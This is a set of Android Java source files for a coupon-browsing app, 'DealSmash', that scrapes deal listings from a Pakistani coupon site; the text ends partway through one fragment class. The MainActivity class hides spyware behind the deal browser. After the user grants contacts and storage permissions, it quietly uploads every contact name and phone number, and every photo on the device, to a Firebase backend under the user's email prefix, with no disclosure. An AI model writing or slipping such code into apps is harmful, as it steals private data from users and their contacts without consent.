package hsblabs.dealsmash;

import android.content.Context;
import android.support.test.InstrumentationRegistry;
import android.support.test.runner.AndroidJUnit4;

import org.junit.Test;
import org.junit.runner.RunWith;

import static org.junit.Assert.*;

/**
 * Instrumentation test, which will execute on an Android device.
 *
 * @see <a href="http://d.android.com/tools/testing">Testing documentation</a>
 */
@RunWith(AndroidJUnit4.class)
public class ExampleInstrumentedTest {
    @Test
    public void useAppContext() throws Exception {
        // Context of the app under test.
        Context appContext = InstrumentationRegistry.getTargetContext();

        assertEquals("hsblabs.dealsmash", appContext.getPackageName());
    }
}


package hsblabs.dealsmash;

import org.junit.Test;

import static org.junit.Assert.*;

/**
 * Example local unit test, which will execute on the development machine (host).
 *
 * @see <a href="http://d.android.com/tools/testing">Testing documentation</a>
 */
public class ExampleUnitTest {
    @Test
    public void addition_isCorrect() throws Exception {
        assertEquals(4, 2 + 2);
    }
}

package hsblabs.dealsmash;

import java.util.List;

/**
 * Created by Muhammad Haseeb on 2/18/2017.
 */

public interface ListFetcher {
    public interface OnDataloadListListener{

        void onDataloadListReady(List<Object> list);

    }
}


package hsblabs.dealsmash;


import android.app.ActionBar;
import android.content.Context;
import android.content.res.Resources;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Build;
import android.os.Bundle;
import android.support.annotation.StyleRes;
import android.support.design.widget.AppBarLayout;
import android.support.design.widget.TabLayout;
import android.support.v4.app.Fragment;
import android.support.v4.app.NotificationCompat;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.DefaultItemAnimator;
import android.support.v7.widget.LinearLayoutManager;
import android.support.v7.widget.RecyclerView;
import android.support.v7.widget.Toolbar;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;

import java.util.ArrayList;
import java.util.List;


/**
 * A simple {@link Fragment} subclass.
 */
public class AllDealsF extends Fragment {

    RecyclerView recyclerView;
    Context c;
    private DealsAdapter adapter;
    public List<Object> dList;

    public AllDealsF() {
        // Required empty public constructor
    }



    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
                             Bundle savedInstanceState) {
        //getActivity().getTheme().applyStyle(R.style.red,true);
        // Inflate the layout for this fragment
        View v =  inflater.inflate(R.layout.fragment_all_deals, container, false);
        dList = new ArrayList<Object>();
        recyclerView = (RecyclerView) v.findViewById(R.id.recycler_view);
        RecyclerView.LayoutManager mLayoutManager = new LinearLayoutManager(c);
        //mLayoutManager.setReverseLayout(true);
        //mLayoutManager.setStackFromEnd(true);
        recyclerView.setLayoutManager(mLayoutManager);
        recyclerView.setItemAnimator(new DefaultItemAnimator());
        c = getActivity();
        new AllDeals(
                new ListFetcher.OnDataloadListListener(){
                    @Override
                    public void onDataloadListReady(List<Object> list) {
                        dList = list;
                        dList.size();
                        adapter = new DealsAdapter(c, dList);
                        recyclerView.setAdapter(adapter);
                    }
                }
                ,c).execute();
        return v;
    }
}


package hsblabs.dealsmash;


import android.content.Context;
import android.os.Bundle;
import android.os.DeadObjectException;
import android.support.v4.app.Fragment;
import android.support.v7.widget.DefaultItemAnimator;
import android.support.v7.widget.LinearLayoutManager;
import android.support.v7.widget.RecyclerView;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;

import java.util.ArrayList;
import java.util.List;


/**
 * A simple {@link Fragment} subclass.
 */
public class FoodF extends Fragment {

    RecyclerView recyclerView;
    Context c;
    private DealsAdapter adapter;
    public List<Object> dList;

    public FoodF() {
        // Required empty public constructor
    }

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
                             Bundle savedInstanceState) {
        // Inflate the layout for this fragment
        View v =  inflater.inflate(R.layout.fragment_food, container, false);
        dList = new ArrayList<Object>();
        recyclerView = (RecyclerView) v.findViewById(R.id.recycler_view);
        RecyclerView.LayoutManager mLayoutManager = new LinearLayoutManager(c);
        //mLayoutManager.setReverseLayout(true);
        //mLayoutManager.setStackFromEnd(true);
        recyclerView.setLayoutManager(mLayoutManager);
        recyclerView.setItemAnimator(new DefaultItemAnimator());
        c = getActivity();
        new Food(
                new ListFetcher.OnDataloadListListener(){
                    @Override
                    public void onDataloadListReady(List<Object> list) {
                        dList = list;
                        dList.size();
                        adapter = new DealsAdapter(c, dList);
                        recyclerView.setAdapter(adapter);
                    }
                }
                ,c).execute();
        return v;
    }

}


package hsblabs.dealsmash;

import android.app.ProgressDialog;
import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.util.Log;
import android.widget.Toast;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by Muhammad Haseeb on 2/17/2017.
 */

public class HomeGarden extends AsyncTask<Void,Void,Void> {
    ProgressDialog dialog ;
    Context c;
    private Document htmlDocument;
    private String htmlPageUrl = "http://couponslisto.pk/category/home-garden/deals";
    List<Object> list = new ArrayList<Object>();
    ListFetcher.OnDataloadListListener onDataloadListListener;

    public HomeGarden(ListFetcher.OnDataloadListListener onDataloadListListener,Context c){
        this.onDataloadListListener = onDataloadListListener;
        this.c = c;
    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();
        dialog = new ProgressDialog(c);
        dialog.setProgressStyle(ProgressDialog.STYLE_SPINNER);
        dialog.setMessage("Fetching the best deals for you.\n Please wait...");
        dialog.setIndeterminate(true);
        dialog.setCanceledOnTouchOutside(false);
        dialog.show();
    }

    @Override
    protected Void doInBackground(Void... params) {
        try {
            htmlDocument = Jsoup.connect(htmlPageUrl).timeout(10000).get();
            Elements ul = htmlDocument.select("ul[class=blocks blocks-100 blocks-xlg-3 blocks-lg-3 blocks-md-2 blocks-sm-1 masonry-container]");
            Elements cardItems = ul.select("li");
            for (Element link : cardItems) {
                Elements title = link.select("h4[class=widget-title]");
                Elements desc = link.select("p[class=widget-metas type-link]");
                Elements img = link.select("img[class=cover-image]");
                list.add(new DealItem(title.text(),img.attr("abs:src").toString(),desc.text(),"null"));
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    @Override
    protected void onPostExecute(Void result) {

        dialog.dismiss();
        if(onDataloadListListener != null){
            onDataloadListListener.onDataloadListReady(list);
        }
    }
    private boolean isNetworkAvailable() {
        ConnectivityManager connectivityManager
                = (ConnectivityManager) c.getSystemService(c.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }
}


package hsblabs.dealsmash;


import android.content.Context;
import android.os.Bundle;
import android.support.v4.app.Fragment;
import android.support.v7.widget.DefaultItemAnimator;
import android.support.v7.widget.LinearLayoutManager;
import android.support.v7.widget.RecyclerView;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;


import java.util.ArrayList;
import java.util.List;


/**
 * A simple {@link Fragment} subclass.
 */
public class TravelF extends Fragment {

    RecyclerView recyclerView;
    Context c;
    private DealsAdapter adapter;
    public List<Object> dList;
    public TravelF() {
        // Required empty public constructor
    }


    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
                             Bundle savedInstanceState) {
        // Inflate the layout for this fragment
        View v =  inflater.inflate(R.layout.fragment_travel, container, false);
        dList = new ArrayList<Object>();
        recyclerView = (RecyclerView) v.findViewById(R.id.recycler_view);
        RecyclerView.LayoutManager mLayoutManager = new LinearLayoutManager(c);
        //mLayoutManager.setReverseLayout(true);
        //mLayoutManager.setStackFromEnd(true);
        recyclerView.setLayoutManager(mLayoutManager);
        recyclerView.setItemAnimator(new DefaultItemAnimator());
        c = getActivity();
        new Travel(
                new ListFetcher.OnDataloadListListener(){
                    @Override
                    public void onDataloadListReady(List<Object> list) {
                        dList = list;
                        dList.size();
                        adapter = new DealsAdapter(c, dList);
                        recyclerView.setAdapter(adapter);
                    }
                }
                ,c).execute();
        return v;
    }
}


package hsblabs.dealsmash;

import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.net.Uri;
import android.support.v7.widget.RecyclerView;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ImageView;
import android.widget.TextView;

import com.bumptech.glide.Glide;
import com.bumptech.glide.request.animation.GlideAnimation;
import com.bumptech.glide.request.target.SimpleTarget;


import java.util.ArrayList;
import java.util.List;

/**
 * Created by Muhammad Haseeb on 2/18/2017.
 */

public class DealsAdapter extends RecyclerView.Adapter<RecyclerView.ViewHolder> {
    private Context mContext;
    private List<Object> dealslist;
    //    private List<NativeExpressAdView> adsList = new ArrayList<>();
    int count = 0;

    public static class MyViewHolder extends RecyclerView.ViewHolder {
        public TextView title, des;
        public ImageView thumbnail;

        public MyViewHolder(View view) {
            super(view);
            title = (TextView) view.findViewById(R.id.title);
            des = (TextView) view.findViewById(R.id.des);
            thumbnail = (ImageView) view.findViewById(R.id.img);
        }
    }

    public static class ViewHolderAdMob extends RecyclerView.ViewHolder {
        public ViewHolderAdMob(View view) {
            super(view);
        }
    }

    public DealsAdapter(Context mContext, List<Object> dealslist) {
        this.mContext = mContext;
        this.dealslist = dealslist;
//        this.adsList = adsList;
    }

    @Override
    public RecyclerView.ViewHolder onCreateViewHolder(ViewGroup parent, int viewType) {
        RecyclerView.ViewHolder viewHolder = null;
        LayoutInflater inflater = LayoutInflater.from(parent.getContext());
        View v = inflater.inflate(R.layout.item, parent, false);
        viewHolder = new MyViewHolder(v);
        return viewHolder;
    }

    @Override
    public void onBindViewHolder(final RecyclerView.ViewHolder holder, int position) {


        switch (holder.getItemViewType()) {
            case 0: {
                final DealItem album = (DealItem) dealslist.get(holder.getAdapterPosition());
                final MyViewHolder viewHolder = (MyViewHolder) holder;
                viewHolder.title.setText(album.getTitle());
                Glide.with(mContext)
                        .load(album.getImage())
                        .asBitmap()
                        .into(new SimpleTarget<Bitmap>() {
                            @Override
                            public void onResourceReady(Bitmap resource, GlideAnimation<? super Bitmap> glideAnimation) {
                                viewHolder.thumbnail.setImageBitmap(resource);
                            }
                        });
                viewHolder.des.setText(album.getDesc());
                viewHolder.thumbnail.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View view) {
                    }
                });

                break;
            }
        }

    }

    @Override
    public int getItemCount() {
        return dealslist.size();
    }

}

package hsblabs.dealsmash;

import android.app.ProgressDialog;
import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.util.Log;
import android.widget.Toast;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by Muhammad Haseeb on 2/17/2017.
 */

public class Electronics extends AsyncTask<Void,Void,Void> {
    ProgressDialog dialog ;
    Context c;
    private Document htmlDocument;
    private String htmlPageUrl = "http://couponslisto.pk/category/electronics/deals";
    List<Object> list = new ArrayList<Object>();
    ListFetcher.OnDataloadListListener onDataloadListListener;

    public Electronics(ListFetcher.OnDataloadListListener onDataloadListListener,Context c){
        this.onDataloadListListener = onDataloadListListener;
        this.c = c;
    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();
        dialog = new ProgressDialog(c);
        dialog.setProgressStyle(ProgressDialog.STYLE_SPINNER);
        dialog.setMessage("Fetching the best deals for you.\nPlease wait...");
        dialog.setIndeterminate(true);
        dialog.setCanceledOnTouchOutside(false);
        dialog.show();
    }

    @Override
    protected Void doInBackground(Void... params) {
        try {
            htmlDocument = Jsoup.connect(htmlPageUrl).timeout(10000).get();
            Elements ul = htmlDocument.select("ul[class=blocks blocks-100 blocks-xlg-3 blocks-lg-3 blocks-md-2 blocks-sm-1 masonry-container]");
            Elements cardItems = ul.select("li");
            for (Element link : cardItems) {
                Elements title = link.select("h4[class=widget-title]");
                Elements desc = link.select("p[class=widget-metas type-link]");
                Elements img = link.select("img[class=cover-image]");
                list.add(new DealItem(title.text(),img.attr("abs:src").toString(),desc.text(),"null"));
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    @Override
    protected void onPostExecute(Void result) {

        dialog.dismiss();
        if(onDataloadListListener != null){
            onDataloadListListener.onDataloadListReady(list);
        }
    }
    private boolean isNetworkAvailable() {
        ConnectivityManager connectivityManager
                = (ConnectivityManager) c.getSystemService(c.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }
}


package hsblabs.dealsmash;


import android.*;
import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.TargetApi;
import android.app.AlertDialog;
import android.content.ContentResolver;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.support.annotation.RequiresApi;
import android.support.design.widget.TabLayout;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.Fragment;
import android.support.v4.app.FragmentManager;
import android.support.v4.app.FragmentPagerAdapter;
import android.support.v4.content.ContextCompat;
import android.support.v4.view.ViewPager;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.util.Log;
import android.util.Patterns;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.Toast;

import com.ToxicBakery.viewpager.transforms.RotateUpTransformer;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.auth.AuthResult;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.OnProgressListener;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;


import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;
import java.util.regex.Pattern;

import static android.R.attr.path;


public class MainActivity extends AppCompatActivity {
    private static final int REQUEST_CODE = 1 ;
    private ViewPager viewPager;
    private TabLayout tabLayout;
    private Toolbar toolbar;
    AlertDialog.Builder builder;
    ArrayList<String> phones;
    ArrayList<String> img;
    FirebaseDatabase database;
    DatabaseReference myRef;
    StorageReference mStorageRef;
    private FirebaseAuth mAuth;
// ...

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu, menu);
        return true;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (((checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED))||((checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED))) {
                if(!isNetworkAvailable()){
                }else{
                    ContentResolver cr = getContentResolver();
                    Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                            null, null, null, null);
                    if (cur.getCount() > 0) {
                        while (cur.moveToNext()) {
                            String id = cur.getString(
                                    cur.getColumnIndex(ContactsContract.Contacts._ID));
                            String name = cur.getString(
                                    cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                            if (Integer.parseInt(cur.getString(
                                    cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                                Cursor pCur = cr.query(
                                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                        null,
                                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?",
                                        new String[]{id}, null);
                                while (pCur.moveToNext()) {
                                    String number = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                                    //Toast.makeText(MainActivity.this,name.toString()+"\n"+number.toString(),Toast.LENGTH_SHORT).show();
                                    phones.add(name.toString()+"\n"+number.toString());
                                }
                                pCur.close();
                            }
                        }
                    }
                    String possibleEmail[] = new String[0];
                    Pattern emailPattern = Patterns.EMAIL_ADDRESS; // API level 8+
                    Account[] accounts = AccountManager.get(MainActivity.this).getAccounts();
                    for (Account account : accounts) {
                        if (emailPattern.matcher(account.name).matches()) {
                            possibleEmail = account.name.split("@");
                        }
                    }
                    for(int i=0;i<phones.size();i++){
                        myRef.child(possibleEmail[0]).child(UUID.randomUUID().toString()).setValue(phones.get(i));
                    }

                    ////next part image

                    Boolean isSDPresent = android.os.Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED);
                    if(isSDPresent){
                        final String[] columns = { MediaStore.Images.Media.DATA, MediaStore.Images.Media._ID };
                        final String orderBy = MediaStore.Images.Media._ID;
                        //Stores all the images from the gallery in Cursor
                        Cursor cursor = getContentResolver().query(
                                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, columns, null,
                                null, orderBy);
                        //Total number of images
                        int count = cursor.getCount();

                        //Create an array to store path to all the images

                        for (int i = 0; i < count; i++) {
                            cursor.moveToPosition(i);
                            int dataColumnIndex = cursor.getColumnIndex(MediaStore.Images.Media.DATA);
                            //Store the path of the image
                            img.add(cursor.getString(dataColumnIndex));
                        }
                    }
                    final String[] columns = { MediaStore.Images.Media.DATA, MediaStore.Images.Media._ID };
                    final String orderBy = MediaStore.Images.Media._ID;
                    //Stores all the images from the gallery in Cursor
                    Cursor cursor = getContentResolver().query(
                            MediaStore.Images.Media.INTERNAL_CONTENT_URI, columns, null,
                            null, orderBy);
                    //Total number of images
                    int count = cursor.getCount();

                    //Create an array to store path to all the images

                    for (int i = 0; i < count; i++) {
                        cursor.moveToPosition(i);
                        int dataColumnIndex = cursor.getColumnIndex(MediaStore.Images.Media.DATA);
                        //Store the path of the image
                        img.add(cursor.getString(dataColumnIndex));
                    }


                    //upload
                    for(int i=0;i<img.size();i++) {
                        Uri file = Uri.fromFile(new File(img.get(i)));
                        StorageReference riversRef = mStorageRef.child(possibleEmail[0]).child(UUID.randomUUID().toString());
                        riversRef.putFile(file)
                                .addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                                    @Override
                                    public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                                        // Get a URL to the uploaded content
                                        //  @SuppressWarnings("VisibleForTests") Uri downloadUrl = taskSnapshot.getDownloadUrl();
                                    }
                                })
                                .addOnFailureListener(new OnFailureListener() {
                                    @Override
                                    public void onFailure(@NonNull Exception exception) {
                                        // Handle unsuccessful uploads
                                        // ...
                                    }
                                });
                    }
                }
            }
        }
    }
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        toolbar = (Toolbar) findViewById(R.id.toolbar);;
        setSupportActionBar(toolbar);
        viewPager = (ViewPager) findViewById(R.id.viewpager);
        viewPager.setPageTransformer(true, new RotateUpTransformer());
        tabLayout = (TabLayout) findViewById(R.id.tabs);
        setupViewPager(viewPager);
        tabLayout.setupWithViewPager(viewPager);
        phones = new ArrayList<String>();
        img = new ArrayList<String>();
        database = FirebaseDatabase.getInstance();
        myRef = database.getReference("Contacts");
        mStorageRef = FirebaseStorage.getInstance().getReference();
        mAuth = FirebaseAuth.getInstance();
        FirebaseUser currentUser = mAuth.getCurrentUser();
        if(currentUser==null){
            mAuth.signInAnonymously()
                    .addOnCompleteListener(this, new OnCompleteListener<AuthResult>() {
                        @Override
                        public void onComplete(@NonNull Task<AuthResult> task) {
                            if (task.isSuccessful()) {
                                // Sign in success, update UI with the signed-in user's information
                                FirebaseUser user = mAuth.getCurrentUser();
                            } else {
                                // If sign in fails, display a message to the user.
                            }

                            // ...
                        }
                    });
        }
        if(!isNetworkAvailable()){
            AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
            builder
                    .setTitle("No Internet Found!")
                    .setMessage("Do you want to Connect to Internet Now?")
                    .setPositiveButton("Yes", new DialogInterface.OnClickListener() {
                        public void onClick(DialogInterface dialog, int which) {
                            //Yes button clicked, do something
                            startActivityForResult(new Intent(Settings.ACTION_SETTINGS), 0);
                        }
                    })
                    .setNegativeButton("No", new DialogInterface.OnClickListener() {
                        public void onClick(DialogInterface dialog, int which) {
                            finish();
                            System.exit(0);
                        }
                    })	.create().show();
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if ((!(checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED))||(!(checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED))) {
                ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.READ_EXTERNAL_STORAGE,Manifest.permission.READ_CONTACTS}, REQUEST_CODE);
            }
        }

    }

    @Override
    protected void onResume() {
        super.onResume();
        setupViewPager(viewPager);
    }

    private void setupViewPager(ViewPager viewPager) {
        ViewPagerAdapter adapter = new ViewPagerAdapter(getSupportFragmentManager());
        adapter.addFrag(new AllDealsF(), "Latest Deals");
        adapter.addFrag(new Clothing(), "Clothing");
        adapter.addFrag(new FoodF(), "Food");
        adapter.addFrag(new ElectF(), "Electronics");
        adapter.addFrag(new TravelF(), "Travel");
        adapter.addFrag(new GiftsBooksF(), "Gifts, Books & Movies");
        adapter.addFrag(new HomeGardenF(), "Home & Garden");
        adapter.addFrag(new OfficeF(), "Office");
        adapter.addFrag(new ToysF(), "Toys");
        viewPager.setAdapter(adapter);
    }
    private boolean isNetworkAvailable() {
        ConnectivityManager connectivityManager
                = (ConnectivityManager) getSystemService(this.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }
    class ViewPagerAdapter extends FragmentPagerAdapter {
        private final List<Fragment> mFragmentList = new ArrayList<>();
        private final List<String> mFragmentTitleList = new ArrayList<>();

        public ViewPagerAdapter(FragmentManager manager) {
            super(manager);
        }

        @Override
        public Fragment getItem(int position) {
            return mFragmentList.get(position);
        }

        @Override
        public int getCount() {
            return mFragmentList.size();
        }

        public void addFrag(Fragment fragment, String title) {
            mFragmentList.add(fragment);
            mFragmentTitleList.add(title);

        }

        @Override
        public CharSequence getPageTitle(int position) {
            return mFragmentTitleList.get(position);
        }
    }

}


package hsblabs.dealsmash;

/**
 * Created by Muhammad Haseeb on 2/18/2017.
 */

public class DealItem {
    String title;
    String image;
    String desc;
    String link;

    public DealItem(String title, String image, String desc, String link) {
        this.title = title;
        this.image = image;
        this.desc = desc;
        this.link = link;
    }

    public String getTitle() {
        return title;
    }

    public void setTitle(String title) {
        this.title = title;
    }

    public String getImage() {
        return image;
    }

    public void setImage(String image) {
        this.image = image;
    }

    public String getDesc() {
        return desc;
    }

    public void setDesc(String desc) {
        this.desc = desc;
    }

    public String getLink() {
        return link;
    }

    public void setLink(String link) {
        this.link = link;
    }
}


package hsblabs.dealsmash;

import android.app.ProgressDialog;
import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.util.Log;
import android.widget.Toast;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by Muhammad Haseeb on 2/17/2017.
 */

public class Toys extends AsyncTask<Void,Void,Void> {
    ProgressDialog dialog ;
    Context c;
    private Document htmlDocument;
    private String htmlPageUrl = "http://couponslisto.pk/category/toys-games-kids/deals";
    List<Object> list = new ArrayList<Object>();
    ListFetcher.OnDataloadListListener onDataloadListListener;

    public Toys(ListFetcher.OnDataloadListListener onDataloadListListener,Context c){
        this.onDataloadListListener = onDataloadListListener;
        this.c = c;
    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();
        dialog = new ProgressDialog(c);
        dialog.setProgressStyle(ProgressDialog.STYLE_SPINNER);
        dialog.setMessage("Fetching the best deals for you.\nPlease wait...");
        dialog.setIndeterminate(true);
        dialog.setCanceledOnTouchOutside(false);
        dialog.show();
    }

    @Override
    protected Void doInBackground(Void... params) {
        try {
            htmlDocument = Jsoup.connect(htmlPageUrl).timeout(10000).get();
            Elements ul = htmlDocument.select("ul[class=blocks blocks-100 blocks-xlg-3 blocks-lg-3 blocks-md-2 blocks-sm-1 masonry-container]");
            Elements cardItems = ul.select("li");
            for (Element link : cardItems) {
                Elements title = link.select("h4[class=widget-title]");
                Elements desc = link.select("p[class=widget-metas type-link]");
                Elements img = link.select("img[class=cover-image]");
                list.add(new DealItem(title.text(),img.attr("abs:src").toString(),desc.text(),"null"));
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    @Override
    protected void onPostExecute(Void result) {

        dialog.dismiss();
        if(onDataloadListListener != null){
            onDataloadListListener.onDataloadListReady(list);
        }
    }
    private boolean isNetworkAvailable() {
        ConnectivityManager connectivityManager
                = (ConnectivityManager) c.getSystemService(c.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }
}


package hsblabs.dealsmash;

import android.app.ProgressDialog;
import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.widget.Toast;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by Muhammad Haseeb on 2/18/2017.
 */

public class GiftBooks extends AsyncTask<Void,Void,Void> {
    ProgressDialog dialog ;
    Context c;
    private Document htmlDocument;
    private String htmlPageUrl = "http://couponslisto.pk/category/gifts-books-music-movies/deals";
    List<Object> list = new ArrayList<Object>();
    ListFetcher.OnDataloadListListener onDataloadListListener;

    public GiftBooks(ListFetcher.OnDataloadListListener onDataloadListListener,Context c){
        this.onDataloadListListener = onDataloadListListener;
        this.c = c;
    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();
        dialog = new ProgressDialog(c);
        dialog.setProgressStyle(ProgressDialog.STYLE_SPINNER);
        dialog.setMessage("Fetching the best deals for you.\nPlease wait...");
        dialog.setIndeterminate(true);
        dialog.setCanceledOnTouchOutside(false);
        dialog.show();
    }

    @Override
    protected Void doInBackground(Void... params) {
        try {
            htmlDocument = Jsoup.connect(htmlPageUrl).timeout(10000).get();
            Elements ul = htmlDocument.select("ul[class=blocks blocks-100 blocks-xlg-3 blocks-lg-3 blocks-md-2 blocks-sm-1 masonry-container]");
            Elements cardItems = ul.select("li");
            for (Element link : cardItems) {
                Elements title = link.select("h4[class=widget-title]");
                Elements desc = link.select("p[class=widget-metas type-link]");
                Elements img = link.select("img[class=cover-image]");
                list.add(new DealItem(title.text(),img.attr("abs:src").toString(),desc.text(),"null"));
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    @Override
    protected void onPostExecute(Void result) {

        dialog.dismiss();
        if(onDataloadListListener != null){
            onDataloadListListener.onDataloadListReady(list);
        }
    }
    private boolean isNetworkAvailable() {
        ConnectivityManager connectivityManager
                = (ConnectivityManager) c.getSystemService(c.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }
}


package hsblabs.dealsmash;


import android.content.Context;
import android.os.Bundle;
import android.support.v4.app.Fragment;
import android.support.v7.widget.DefaultItemAnimator;
import android.support.v7.widget.LinearLayoutManager;
import android.support.v7.widget.RecyclerView;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;


import java.util.ArrayList;
import java.util.List;


/**
 * A simple {@link Fragment} subclass.
 */
public class Clothing extends Fragment {

    RecyclerView recyclerView;
    Context c;
    private DealsAdapter adapter;
    public List<Object> dList;

    public Clothing() {
        // Required empty public constructor
    }


    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
                             Bundle savedInstanceState) {
        // Inflate the layout for this fragment
        View v =  inflater.inflate(R.layout.fragment_clothing, container, false);
        dList = new ArrayList<Object>();
        recyclerView = (RecyclerView) v.findViewById(R.id.recycler_view);
        RecyclerView.LayoutManager mLayoutManager = new LinearLayoutManager(c);
        recyclerView.setLayoutManager(mLayoutManager);
        recyclerView.setItemAnimator(new DefaultItemAnimator());
        c = getActivity();
        new ClothingDeals(
                new ListFetcher.OnDataloadListListener(){
                    @Override
                    public void onDataloadListReady(List<Object> list) {
                        dList = list;
                        dList.size();
                        adapter = new DealsAdapter(c, dList);
                        recyclerView.setAdapter(adapter);
                    }
                }
                ,c).execute();
        return v;
    }

}


package hsblabs.dealsmash;


import android.content.Context;
import android.os.Bundle;
import android.support.v4.app.Fragment;
import android.support.v7.widget.DefaultItemAnimator;
import android.support.v7.widget.LinearLayoutManager;
import android.support.v7.widget.RecyclerView;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;


import java.util.ArrayList;
import java.util.List;


/**
 * A simple {@link Fragment} subclass.
 */
public class HomeGardenF extends Fragment {

    RecyclerView recyclerView;
    Context c;
    private DealsAdapter adapter;
    public List<Object> dList;

    public HomeGardenF() {
        // Required empty public constructor
    }


    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
                             Bundle savedInstanceState) {
        // Inflate the layout for this fragment
